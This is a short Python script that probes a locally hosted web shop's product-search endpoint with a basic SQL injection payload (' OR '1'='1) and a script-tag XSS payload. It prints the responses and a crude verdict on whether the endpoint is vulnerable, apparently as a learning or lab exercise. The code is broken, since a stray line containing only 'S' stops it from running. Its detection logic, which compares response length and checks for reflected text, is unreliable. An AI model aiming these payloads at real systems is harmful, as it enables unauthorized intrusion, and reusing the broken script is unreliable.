import requests
url = "http://127.0.0.1:3000/rest/products/search"
normal = requests.get(url, params={"q": "apple"}).text
payload = "' OR '1'='1"
sqli = requests.get(url,params={"q": payload}). text

payload_xss = "<script>alert('XSS')</script>"
xss = requests.get(url, params={"q":payload_xss}).text
S
print("===Normal Search===")
print(normal[:300])

print("\n=== SQLI Attempt ===")
print(sqli[:300])

if len(sqli) > len(normal):
	print("\n Vulnerable to SQL Injection")
else:
	print("\n Not vulnerable (at least not to this simple test).")
print("\n===XSS Attempt===")
print(xss[:300])
if payload_xss in xss: 
	print("\n Vulnerable to XSS")
else:
	print("\n Not vulnerable to XSS (at least not this simple test).")

